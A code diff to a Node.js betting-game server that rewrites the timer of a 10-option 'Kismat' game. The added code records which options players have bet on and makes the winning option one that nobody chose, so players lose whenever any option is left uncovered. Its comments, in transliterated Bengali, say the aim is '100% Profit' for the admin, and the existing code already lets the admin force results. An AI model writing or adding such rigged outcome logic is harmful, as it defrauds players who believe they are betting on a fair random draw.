@@ -8,7 +8,6 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
-// Explicit Admin Route
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'admin.html'));
 });
@@ -154,14 +153,38 @@ setInterval(async () => {
   io.emit('admin_update', await getAdminPayload());
 }, 1000);
 
-// Kismat Game Timer (150s)
+// Kismat Game Timer (150s) - Smart Logic: Jekhane bet nei shetai win hobe, sob lagale random hobe!
 setInterval(async () => {
   kismatState.timeLeft -= 1;
   if (kismatState.timeLeft <= 0) {
     let winOption = Math.floor(Math.random() * 10) + 1;
+
     if (forcedKismatOption !== null) {
       winOption = forcedKismatOption;
       forcedKismatOption = null;
+    } else {
+      // Check kon kon option-e bet lagano hoyeche
+      let bettedOptions = new Set();
+      currentKismatBets.forEach(b => {
+        let optNum = parseInt(b.choice.replace('Option #', ''));
+        bettedOptions.add(optNum);
+      });
+
+      // Je option gulo te KOKHONO bet lagbe ni (1 theke 10 er modhye empty gulo)
+      let emptyOptions = [];
+      for (let i = 1; i <= 10; i++) {
+        if (!bettedOptions.has(i)) {
+          emptyOptions.push(i);
+        }
+      }
+
+      // Jodi emon option thake jekhane keu bet lagay ni, tabe tar modhye theke ekta win hobe (Admin 100% Profit)
+      if (emptyOptions.length > 0) {
+        winOption = emptyOptions[Math.floor(Math.random() * emptyOptions.length)];
+      } else {
+        // Jodi 10 tai option-e bet lagano thake, tobe system automatic random korbe
+        winOption = Math.floor(Math.random() * 10) + 1;
+      }
     }
     
     for (const b of currentKismatBets) {
